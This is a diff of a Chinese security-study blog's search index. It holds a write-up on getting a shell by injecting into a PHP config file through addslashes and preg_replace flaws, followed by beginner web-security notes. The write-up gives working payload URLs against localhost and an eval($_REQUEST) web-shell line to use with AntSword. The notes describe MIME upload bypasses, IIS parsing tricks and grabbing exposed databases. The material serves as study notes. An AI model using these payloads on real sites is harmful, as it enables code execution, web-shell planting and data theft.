+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);`</span><br><span class="line">`<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p><code>config.php</code> 的内容如下:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+<p>要求是要<code>getshell</code>,这个场景十分经典，常用在修改配置文件写入的时候。<br>此处不存在之前说的那个配置文件中用的是<code>”双引号”</code>引起任意代码执行的问题,这这里面用的是单引号,而且 <code>addslashes()</code>处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>
+<h2 id="方法一-利用换行符来绕过正则匹配的问题"><a href="#方法一-利用换行符来绕过正则匹配的问题" class="headerlink" title="方法一,利用换行符来绕过正则匹配的问题"></a>方法一,利用换行符来绕过正则匹配的问题</h2><p>可以看到正则匹配的是以下内容:</p>
+<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$optio</span>n=<span class="string">&#x27;任意内容&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>任意内容里面是可以包含转移符 <code>\</code> 的,所以我们利用下面的方法:</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>
+
+
+<p>执行完第一个之后,<code>config.php</code>中的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\&#x27;;</span></span><br><span class="line"><span class="string">phpinfo();//&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>但是这样并没有办法执行<code>phpinfo()</code>,因为我们插入的 单引号 被转移掉了,所以<code>phpinfo()</code>还是在单引号的包裹之内.<br>我们在访问下面这个</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>/index.php?option=a</span><br></pre></td></tr></table></figure>
+
+
+<p>因为正则 <code>.*</code> 会匹配行内的任意字符无数次.所以 <code>\</code> 也被认为是其中的一部分,也会被替换掉,执行完之后,<code>config.php</code>中的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>转义符就被替换掉了,就成功的<code>getshell</code>.</p>
+<h2 id="方法二-利用-preg-replace函数的问题"><a href="#方法二-利用-preg-replace函数的问题" class="headerlink" title="方法二,利用 preg_replace函数的问题:"></a>方法二,利用 preg_replace函数的问题:</h2><p>用<code>preg_replace()</code>的时候<code>replacement(第二个参数)</code>也要经过正则引擎处理，所以正则引擎把<code>\\</code>转义成了<code>\</code><br>也就是说如果字符串是<code>\\\&amp;#39;</code>,经过 <code>preg_replace()</code>的处理,就变为 <code>#39;</code>,单引号就逃出来了.<br>所以<code>payload</code>如下:</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/index.php?option=a\&#x27;;phpinfo();/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure>
+
+
+<p><code>config.php</code>变为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\\&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>
+
+<p>**道理就是  <code>a\&amp;#39;;phpinfo();//</code>  经过 <code>addslashes()</code>处理之后,变为<code>a\\\&amp;#39;;phpinfo();//</code> 然后两个反斜杠被<code>preg_replace</code>变成了一个,导致单引号逃脱.</p>
+<h2 id="方法三-利用-preg-replace-函数的第二个参数的问题"><a href="#方法三-利用-preg-replace-函数的第二个参数的问题" class="headerlink" title="方法三, 利用 preg_replace() 函数的第二个参数的问题"></a>方法三, 利用 preg_replace() 函数的第二个参数的问题</h2><p>先看官方对<code>preg_replace()</code>函数的描述<code>manual</code><br>函数原型:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xed <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>
+
+
+<p>对<code>replacement</code>的描述.<br><code>replacement</code>中可以包含后</p>
+<p>向<code>引用\\n或(php 4.0.4以上可用)$n</code>，语法上首选后者。 每个 这样的引用将被匹配到的第<code>n</code>个捕获子组捕获到的文本替换。 <code>n</code> 可以是<code>0-99</code>，<code>\\0</code>和<code>$0</code>代表完整的模式匹配文本。</p>
+<p>所以我们可以用:</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=;phpinfo();</span><br><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option= 或者 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure>
+
+
+<p>执行第一条后<code>config.php</code>的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+<p>再执行第二条后<code>config.php</code>的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;$option=&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="string">&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.</p>
+<hr>
+<p>要<code>getshell</code>直接</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">把<span class="built_in">phpinfo</span>()替换成</span><br><span class="line"><span class="function"><span class="title">eval</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">assert</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line">蚁剑连接即可</span><br></pre></td></tr></table></figure>
+
+<hr>
+]]></content>
+      <categories>
+        <category>网络安全学习</category>
+      </categories>
+      <tags>
+        <tag>实战</tag>
       </tags>
   </entry>
   <entry>
@@ -3271,122 +3271,6 @@ handler 指向RequestHandler
       </tags>
   </entry>
   <entry>
-    <title>小迪web视频学习记录</title>
-    <url>/2022/07/21/xiaodi/</url>
-    <content><![CDATA[<p><u><code>看看小迪师傅的视频，把一些知识点补充以及深入学习一下，做做笔记</code></u></p>
-<span id="more"></span>
-
-<hr>
-<p><code>时间不是按小迪师傅视频来的，是看我当天的时间，尽量每天能看个一两个吧</code></p>
-<h2 id="DAY1-基础入门-概念名词"><a href="#DAY1-基础入门-概念名词" class="headerlink" title="DAY1 基础入门-概念名词"></a>DAY1 基础入门-概念名词</h2><p><img src="/2022/07/21/xiaodi/image-20220725210618077.png" alt="image-20220725210618077"></p>
-<p><strong>1.DNS</strong>：一般指域名系统，可以将IP和域名相互转化，比如访问baidu.com，DNS就会查出它的IP例如120.0.0.1，进行访问，从而人们不用输入复杂的IP</p>
-<p>我们有时<u>打开一些网站或者下载东西时卡顿</u>，我们百度往往会得到一个方法修改<strong>hosts</strong>文件</p>
-<p><strong>hosts</strong>文件负责解析域名并优先于DNS服务，通常很多恶意软件会恶意更改该文件来达到劫持网站的目地，也就是DNS攻击</p>
-<p>比如下图，当在<strong>hosts</strong>文件里加上时，当我们在浏览器访问<code>www.baidu.com</code>的时候就会访问<strong>IP:14.215.177.38</strong>，而这个<strong>IP</strong>可能是百度的网站，也可能是钓鱼网站的IP，这个时候我们光看浏览器网站域名就根本分不清楚（如果钓鱼网站页面和我们的目标网站界面一致）</p>
-<p><img src="/2022/07/21/xiaodi/image-20220721145608355.png" alt="image-20220721145608355"></p>
-<hr>
-<h2 id="DAY2-基础入门-数据包拓展"><a href="#DAY2-基础入门-数据包拓展" class="headerlink" title="DAY2 基础入门-数据包拓展"></a>DAY2 基础入门-数据包拓展</h2><h3 id="1-proxy"><a href="#1-proxy" class="headerlink" title="1.proxy"></a>1.proxy</h3><p>下面这张图很好的解释了<strong>proxy</strong>的作用，它是浏览器和服务器之间的，是两者数据交互的中间桥梁，利用<strong>proxy</strong>就可以实现修改浏览器发送的请求和服务器发回的数据包，或者拦截获取</p>
-<p><img src="/2022/07/21/xiaodi/image-20220721144031544.png" alt="image-20220721144031544"></p>
-<h3 id="2-http和https"><a href="#2-http和https" class="headerlink" title="2.http和https"></a>2.http和https</h3><p><strong>https</strong>相对<strong>http</strong>更安全的原因在于<strong>SSL or TLS</strong>的存在，它不在像<strong>http</strong>一样把信息以明文的形式呈现出来，比如利用<strong>burp</strong>抓包，http的信息（比如账号密码）就会显现出来，而<strong>SSL or TLS</strong>会对其信息进行加密<strong>（需要私钥才解的开）</strong>，那就算被抓包，也只能得到一串加密数据</p>
-<p><u>这里推荐可以买本<strong>《图解http》</strong>看看</u></p>
-<p><img src="/2022/07/21/xiaodi/image-20220721144040328.png" alt="image-20220721144040328"></p>
-<p> 下面是http简要通讯流程</p>
-<p><img src="/2022/07/21/xiaodi/1.png" alt="image-20220721150847367"></p>
-<p>下面就是https的响应流程</p>
-<p><img src="/2022/07/21/xiaodi/image-20220721150429225.png" alt="image-20220721150429225"></p>
-<h3 id="3-Request请求数据包"><a href="#3-Request请求数据包" class="headerlink" title="3.Request请求数据包"></a>3.Request请求数据包</h3><p><img src="/2022/07/21/xiaodi/image-20220723220144117.png" alt="image-20220723220144117"></p>
-<h4 id="1-请求行"><a href="#1-请求行" class="headerlink" title="1.请求行"></a>1.请求行</h4><p>如下例，</p>
-<p>请求方法：GET   ||  请求url：index.html  ||   HTTP版本：1.1</p>
-<p><img src="/2022/07/21/xiaodi/image-20220723220333853.png" alt="image-20220723220333853"></p>
-<p><img src="/2022/07/21/xiaodi/image-20220723221340261.png" alt="image-20220723221340261"></p>
-<h4 id="2-请求头"><a href="#2-请求头" class="headerlink" title="2.请求头"></a>2.请求头</h4><p><img src="/2022/07/21/xiaodi/image-20220724172547877.png" alt="image-20220724172547877"></p>
-<p>1）MIME文件格式可以修改绕过MIME验证，在文件上传的时候，就可以修改MIME类型来绕过前端验证</p>
-<p>比如需要图片格式，但设有MIME验证，而上传php或其他文件时，</p>
-<p>Accept为application&#x2F;octet-stream   为了上传成功就需要修改其为image&#x2F;png，从而绕过MIME验证</p>
-<p><img src="/2022/07/21/xiaodi/image-20220724173613276.png" alt="image-20220724173613276"></p>
-<p>Referer代表产生请求的网页，如果是在该网站访问该网站的链接，那referer可能为空，如果是从其他网站请求访问，就会在referer处显示网站url</p>
-<p>一些网站可能会验证referer判断是否可能是从其他网站来的，保护用户账号安全，避免用户cookie被盗用，也就是csrf漏洞</p>
-<p><img src="/2022/07/21/xiaodi/image-20220724175117961.png" alt="image-20220724175117961"></p>
-<h4 id="3-空行和请求体"><a href="#3-空行和请求体" class="headerlink" title="3.空行和请求体"></a>3.空行和请求体</h4><p><img src="/2022/07/21/xiaodi/image-20220724211529241.png" alt="image-20220724211529241"></p>
-<p>空行和请求体可以看看下面这个例子</p>
-<p><img src="/2022/07/21/xiaodi/image-20220724203919573.png" alt="image-20220724203919573"></p>
-<p>可以看到请求体是<code>id=1&amp;submit=%E6%9F%A5%E8%AF%A2</code>而其上面就是和请求头分开的空行</p>
-<p><img src="/2022/07/21/xiaodi/image-20220724203945852.png" alt="image-20220724203945852"></p>
-<h3 id="4-response返回数据包"><a href="#4-response返回数据包" class="headerlink" title="4.response返回数据包"></a>4.response返回数据包</h3><p><img src="/2022/07/21/xiaodi/image-20220724213601900.png" alt="image-20220724213601900"></p>
-<p><u><strong>HTTP响应码（状态码）</strong></u></p>
-<p><img src="/2022/07/21/xiaodi/image-20220723215355113.png" alt="image-20220723215355113"></p>
-<h4 id="1-状态行"><a href="#1-状态行" class="headerlink" title="1.状态行"></a>1.状态行</h4><p>下例<strong>状态代码</strong>：200  || <strong>协议版本</strong>：HTTP&#x2F;1.1 ||   <strong>状态描述</strong>：OK</p>
-<p><img src="/2022/07/21/xiaodi/image-20220724222056594.png" alt="image-20220724222056594"></p>
-<h4 id="2-响应头标"><a href="#2-响应头标" class="headerlink" title="2.响应头标"></a>2.响应头标</h4><p>上图除了第一行以外就是响应头标，类似请求头</p>
-<h4 id="3-空行"><a href="#3-空行" class="headerlink" title="3.空行"></a>3.空行</h4><p>在响应头标和响应数据之间，表示响应头标的结束</p>
-<h4 id="4-响应数据"><a href="#4-响应数据" class="headerlink" title="4.响应数据"></a>4.响应数据</h4><p><strong>响应数据</strong>就是当前页面的源代码</p>
-<p><img src="/2022/07/21/xiaodi/image-20220724222442836.png" alt="image-20220724222442836"></p>
-<hr>
-<h2 id="DAY3-基础入门-搭建安全拓展"><a href="#DAY3-基础入门-搭建安全拓展" class="headerlink" title="DAY3 基础入门-搭建安全拓展"></a>DAY3 基础入门-搭建安全拓展</h2><h3 id="1-常见搭建平台脚本启用"><a href="#1-常见搭建平台脚本启用" class="headerlink" title="1.常见搭建平台脚本启用"></a>1.常见搭建平台脚本启用</h3><p><img src="/2022/07/21/xiaodi/image-20220725230825776.png" alt="image-20220725230825776"></p>
-<h3 id="2-域名IP目录解析安全问题"><a href="#2-域名IP目录解析安全问题" class="headerlink" title="2.域名IP目录解析安全问题"></a>2.域名IP目录解析安全问题</h3><p><strong>域名访问</strong>时（如<code>www.baidu.com</code>）一般是<strong>指向某个特定文件</strong>，用工具扫描时，也只能扫描该目录下的文件</p>
-<p><strong>IP访问</strong>时就可以<strong>访问到根目录</strong>，扫描时就可能扫描到该站点下的所有文件，甚至还有网站源码备份文件</p>
-<p><u>一般是IP和域名同时使用</u></p>
-<h3 id="3-常见文件后缀解析对应安全"><a href="#3-常见文件后缀解析对应安全" class="headerlink" title="3.常见文件后缀解析对应安全"></a>3.常见文件后缀解析对应安全</h3><p><img src="/2022/07/21/xiaodi/image-20220725210703706.png" alt="image-20220725210703706"></p>
-<p>下图是，iis中间件</p>
-<p>扩展名对应配置文件，使得有该扩展名的文件以配置文件定义的方式打开或运行</p>
-<p>如，添加一个扩展名为.haha，对应的配置文件就为下图的.asp扩展名对应的配置文件，这样打开.haha扩展名的文件就相当于打开.asp类型的文件了</p>
-<p>所以，利用这个有时候我们上传以为正确的文件扩展名，但却无法以我们想要的方式打开或者用蚁剑、菜刀等工具连接，就可能是中间件解析协议修改了本来的扩展名</p>
-<p>如删除了.asp，只保留.haha扩展名，如果上传.asp扩展名文件，就会无效，使得我们受阻，只有上传.haha扩展名文件才可以被视为asp文件</p>
-<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">这里做个补充，，之前做过一个“内部文件上传系统漏洞分析溯源”的题，提到了iis低版本解析漏洞</span><br><span class="line"></span><br><span class="line">IIS解析漏洞分为两种：</span><br><span class="line">（1）一种是在以“<span class="string">.asp</span>”“<span class="string">.asa</span>”命名的文件夹内，所有文件都以asp文件被解析。</span><br><span class="line">（2）第二种是IIS的文件解析,形式：<span class="string">/xx.asp</span>;<span class="string">.jpg</span>（利⽤特殊符号 <span class="string">&quot;;&quot;</span><span class="string">.xx.asp</span>;<span class="string">.jpg</span> 被解析为asp脚本</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/21/xiaodi/image-20220725223658222.png" alt="image-20220725223658222"></p>
-<h3 id="4-常见安全测试中的安全防护"><a href="#4-常见安全测试中的安全防护" class="headerlink" title="4.常见安全测试中的安全防护"></a>4.常见安全测试中的安全防护</h3><h4 id="1-拒绝匿名访问"><a href="#1-拒绝匿名访问" class="headerlink" title="1.拒绝匿名访问"></a>1.拒绝匿名访问</h4><p>这样想要访问网站页面的时候，就需要输入限定账号和密码，否则就无法进行访问</p>
-<h4 id="2-拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）"><a href="#2-拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）" class="headerlink" title="2.拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）"></a>2.拒绝一台电脑或一组电脑的IP或域名限制（也是IP地址限制）</h4><p>通过添加对方IP，来实现在IP内的所有计算机网络都无法访问该网站</p>
-<h3 id="5-WEB后门与用户及文件权限"><a href="#5-WEB后门与用户及文件权限" class="headerlink" title="5.WEB后门与用户及文件权限"></a>5.WEB后门与用户及文件权限</h3><p>利用菜刀等工具，可以连接到服务器中的后门，但是如果服务器端设置了对Internet 来宾用户的权限时，就会遇到阻碍</p>
-<p>如设置拒绝读取，那么菜刀就无法读取该文件夹下的内容，就在前面提到网站的拒绝匿名访问</p>
-<p>如果设置拒绝写入，那么菜刀就无法在其中新建文件</p>
-<p>但是该网站这个目录下的网站页面，也无法正常访问</p>
-<p><img src="/2022/07/21/xiaodi/image-20220726110555183.png" alt="image-20220726110555183"></p>
-<p>下图为网站不给执行权限，也就是里面的文件都无法执行，这样无论是访问我们上传的木马，还是菜刀试着连接木马，都不行，以因为没有了执行权限，那么我们写的一句话木马的代码也发挥不了作用</p>
-<p>这也是实战中为什么会这么困难和复杂</p>
-<p><u><strong>那么一般如何解决这个问题呢？</strong></u></p>
-<p>我们可以试试换一个目录，一般这种限制最可能在例如upload这种目录，但是img这类图片目录下，常理而言是没有脚本文件，所以很有可能是没有加以限制的，所以在上传文件的时候，可以试试抓包然后修改文件上传的目录，从而使得脚本可以正常执行和与工具连接</p>
-<p>一般思路就是把脚本文件努力上传到最可能没有限制的目录下，比如<u>根目录</u>，或者<u>网站自身的脚本目录</u>（因为它自身可能也需要运行它自己的脚本，所以大概率不可能在那个目录下加上权限，这样它自己也无法正常运行了）</p>
-<p><img src="/2022/07/21/xiaodi/image-20220726110523557.png" alt="image-20220726110523557"></p>
-<h3 id="6-网站源码脚本格式"><a href="#6-网站源码脚本格式" class="headerlink" title="6.网站源码脚本格式"></a>6.网站源码脚本格式</h3><p><code>一般可以根据数据库类型，或者网站搭建的中间件平台加以推导</code></p>
-<h4 id="1-知道数据库类型"><a href="#1-知道数据库类型" class="headerlink" title="1.知道数据库类型"></a>1.知道数据库类型</h4><p>mysql数据库一般是php脚本</p>
-<p>sqlserver数据库一般是asp或aspx脚本</p>
-<p>oracle数据库一般是python脚本</p>
-<h4 id="2-知道中间件"><a href="#2-知道中间件" class="headerlink" title="2.知道中间件"></a>2.知道中间件</h4><p>iis一般用asp或aspx</p>
-<p>apache一般php脚本居多</p>
-<p>tomcat一般jsp脚本</p>
-<p>如果判断不出网站的源码脚本文件，</p>
-<p>可能网站做了伪静态，那么在脚本类型不会在网站地址下去体现，但是用<u><strong>扫描工具</strong></u>可以更加深入的爬寻文件</p>
-<p>还有一个方法就是在<u><strong>谷歌搜索引擎</strong></u>上看看有没有该网站的快照信息，有快照信息就可以针对性的用关键词筛选一下，看有没有脚本运行信息出现</p>
-<p>还有就是可以<u><strong>抓网站的数据包</strong></u>，看看数据包里，一般的如果数据包的写法不同，里面的cookie值就会有所不同，比如phpsession,jspsession，就可以根据前缀知道是什么类型的脚本文件 ，如果都不是可能就是asp或aspx</p>
-<hr>
-<h2 id="DAY4-基础入门-WEB源码拓展"><a href="#DAY4-基础入门-WEB源码拓展" class="headerlink" title="DAY4 基础入门-WEB源码拓展"></a>DAY4 基础入门-WEB源码拓展</h2><p><img src="/2022/07/21/xiaodi/image-20220727150617311.png" alt="image-20220727150617311"></p>
-<p><img src="/2022/07/21/xiaodi/image-20220727150829672.png" alt="image-20220727150829672"></p>
-<h3 id="1-网站源码文件目录"><a href="#1-网站源码文件目录" class="headerlink" title="1.网站源码文件目录"></a>1.网站源码文件目录</h3><p><code>admin</code>：后台文件目录</p>
-<p><code>data</code>：数据相关，可能有数据库配置文件【可能直接连接到对方的数据库获得对方的数据库信息】</p>
-<p><code>include</code>：数据库目录</p>
-<p><code>template</code>：网站模板文件,和网站界面相关，优化网站架构【(艹皿艹 )想起学ssti漏洞，看了好几天文章】</p>
-<h3 id="2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"><a href="#2-ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题" class="headerlink" title="2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题"></a>2.ASP，PHP，ASP，JSP，JAVAWEB等脚本类型安全问题</h3><p>可以在这个网站上看看脚本语言类型</p>
-<p><code>https://websec.readthedocs.io/zh/latest/language/index.html</code></p>
-<p>当看到网站的脚本格式时，就大致可以猜测到大概容易出现什么漏洞，</p>
-<p>因为网站源码语言和应用不同，编写的方式也不同，出现的问题也就不同，从而针对性的寻找或修复漏洞，节约时间，提高效率</p>
-<h3 id="3-社交，论坛，门户，第三方，博客等不同代码机制对应漏洞"><a href="#3-社交，论坛，门户，第三方，博客等不同代码机制对应漏洞" class="headerlink" title="3.社交，论坛，门户，第三方，博客等不同代码机制对应漏洞"></a>3.社交，论坛，门户，第三方，博客等不同代码机制对应漏洞</h3><h3 id="4-开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等"><a href="#4-开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等" class="headerlink" title="4.开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等"></a>4.开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等</h3><p>CMS：内容管理系统（content management system，CMS），是一种位于WEB前端（Web  服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、<a href="https://baike.baidu.com/item/Intranet/3247037">Intranet</a>以及<a href="https://baike.baidu.com/item/Extranet/10579301">Extranet</a>网站的信息。</p>
-<h3 id="5-关于源码获取相关途径"><a href="#5-关于源码获取相关途径" class="headerlink" title="5.关于源码获取相关途径"></a>5.关于源码获取相关途径</h3><p>搜索，咸鱼淘宝，第三方源码站，各种行业对应，一些源码可能就可以找到源码，但一般是大众型的，而一些小型（或者灰色的网站）网站可能搜不到的，咸鱼等一些第三方源码可能找到的</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="#总结"></a>#总结</h3><p>关注应用分类及脚本类型估摸出可能存在的漏洞(其中框架类例外)，在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理(数据库备份，bak文件等)，未获取到的源码采用各种方法想办法获取!</p>
-<hr>
-<h3 id="asp网站"><a href="#asp网站" class="headerlink" title="asp网站"></a>asp网站</h3><p>有一个<code>mdb</code>文件【表格文件】，存放数据，相当于数据库，后台的账号密码一般在上面</p>
-<p>如果网站是直接套用的网站源码结构，没有进行修改，其中就包括数据库路径，那么我们就可以尝试把数据库的路径防止物联网网上尝试下载【一般是进行过滤了，几乎不可能下载成功】，</p>
-<p>比如知道<code>www.hahaha.com</code>这个网站的数据库在<code>/admin/schema/</code>这个路径里，数据库文件名为<code>flag.mdb</code></p>
-<p>那我们访问<code>www.hahaha.com/admin/schema/flag.mdb</code>就可能下载下来数据库文件，查看里面的后台的账号和密码【密码一般加密了的(md5)】</p>
-<h3 id="php网站"><a href="#php网站" class="headerlink" title="php网站"></a>php网站</h3>]]></content>
-      <categories>
-        <category>网络安全学习</category>
-      </categories>
-      <tags>
-        <tag>视频学习记录</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>WEB学习笔记</title>
     <url>/2022/05/31/daily/</url>
     <content><![CDATA[<p><u><code>随便记一下，记录学习过程中的学习经验，欢迎指正和补充</code></u></p>
@@ -5378,6 +5262,122 @@ msfvenom -l encoders #列出所有的编码器
       </categories>
       <tags>
         <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>小迪web视频学习记录</title>
+    <url>/2022/07/21/xiaodi/</url>
+    <content><![CDATA[<p><u><code>看看小迪师傅的视频，把一些知识点补充以及深入学习一下，做做笔记</code></u></p>
+<span id="more"></span>
+
+<hr>
+<p><code>时间不是按小迪师傅视频来的，是看我当天的时间，尽量每天能看个一两个吧</code></p>
+<h2 id="DAY1-基础入门-概念名词"><a href="#DAY1-基础入门-概念名词" class="headerlink" title="DAY1 基础入门-概念名词"></a>DAY1 基础入门-概念名词</h2><p><img src="/2022/07/21/xiaodi/image-20220725210618077.png" alt="image-20220725210618077"></p>
+<p><strong>1.DNS</strong>：一般指域名系统，可以将IP和域名相互转化，比如访问baidu.com，DNS就会查出它的IP例如120.0.0.1，进行访问，从而人们不用输入复杂的IP</p>
+<p>我们有时<u>打开一些网站或者下载东西时卡顿</u>，我们百度往往会得到一个方法修改<strong>hosts</strong>文件</p>
+<p><strong>hosts</strong>文件负责解析域名并优先于DNS服务，通常很多恶意软件会恶意更改该文件来达到劫持网站的目地，也就是DNS攻击</p>
+<p>比如下图，当在<strong>hosts</strong>文件里加上时，当我们在浏览器访问<code>www.baidu.com</code>的时候就会访问<strong>IP:14.215.177.38</strong>，而这个<strong>IP</strong>可能是百度的网站，也可能是钓鱼网站的IP，这个时候我们光看浏览器网站域名就根本分不清楚（如果钓鱼网站页面和我们的目标网站界面一致）</p>
+<p><img src="/2022/07/21/xiaodi/image-20220721145608355.png" alt="image-20220721145608355"></p>
+<hr>
+<h2 id="DAY2-基础入门-数据包拓展"><a href="#DAY2-基础入门-数据包拓展" class="headerlink" title="DAY2 基础入门-数据包拓展"></a>DAY2 基础入门-数据包拓展</h2><h3 id="1-proxy"><a href="#1-proxy" class="headerlink" title="1.proxy"></a>1.proxy</h3><p>下面这张图很好的解释了<strong>proxy</strong>的作用，它是浏览器和服务器之间的，是两者数据交互的中间桥梁，利用<strong>proxy</strong>就可以实现修改浏览器发送的请求和服务器发回的数据包，或者拦截获取</p>
+<p><img src="/2022/07/21/xiaodi/image-20220721144031544.png" alt="image-20220721144031544"></p>
+<h3 id="2-http和https"><a href="#2-http和https" class="headerlink" title="2.http和https"></a>2.http和https</h3><p><strong>https</strong>相对<strong>http</strong>更安全的原因在于<strong>SSL or TLS</strong>的存在，它不在像<strong>http</strong>一样把信息以明文的形式呈现出来，比如利用<strong>burp</strong>抓包，http的信息（比如账号密码）就会显现出来，而<strong>SSL or TLS</strong>会对其信息进行加密<strong>（需要私钥才解的开）</strong>，那就算被抓包，也只能得到一串加密数据</p>
+<p><u>这里推荐可以买本<strong>《图解http》</strong>看看</u></p>
+<p><img src="/2022/07/21/xiaodi/image-20220721144040328.png" alt="image-20220721144040328"></p>
+<p> 下面是http简要通讯流程</p>
+<p><img src="/2022/07/21/xiaodi/1.png" alt="image-20220721150847367"></p>
+<p>下面就是https的响应流程</p>
+<p><img src="/2022/07/21/xiaodi/image-20220721150429225.png" alt="image-20220721150429225"></p>
+<h3 id="3-Request请求数据包"><a href="#3-Request请求数据包" class="headerlink" title="3.Request请求数据包"></a>3.Request请求数据包</h3><p><img src="/2022/07/21/xiaodi/image-20220723220144117.png" alt="image-20220723220144117"></p>
+<h4 id="1-请求行"><a href="#1-请求行" class="headerlink" title="1.请求行"></a>1.请求行</h4><p>如下例，</p>
+<p>请求方法：GET   ||  请求url：index.html  ||   HTTP版本：1.1</p>
+<p><img src="/2022/07/21/xiaodi/image-20220723220333853.png" alt="image-20220723220333853"></p>
+<p><img src="/2022/07/21/xiaodi/image-20220723221340261.png" alt="image-20220723221340261"></p>
+<h4 id="2-请求头"><a href="#2-请求头" class="headerlink" title="2.请求头"></a>2.请求头</h4><p><img src="/2022/07/21/xiaodi/image-20220724172547877.png" alt="image-20220724172547877"></p>
+<p>1）MIME文件格式可以修改绕过MIME验证，在文件上传的时候，就可以修改MIME类型来绕过前端验证</p>
+<p>比如需要图片格式，但设有MIME验证，而上传php或其他文件时，</p>
+<p>Accept为application&#x2F;octet-stream   为了上传成功就需要修改其为image&#x2F;png，从而绕过MIME验证</p>
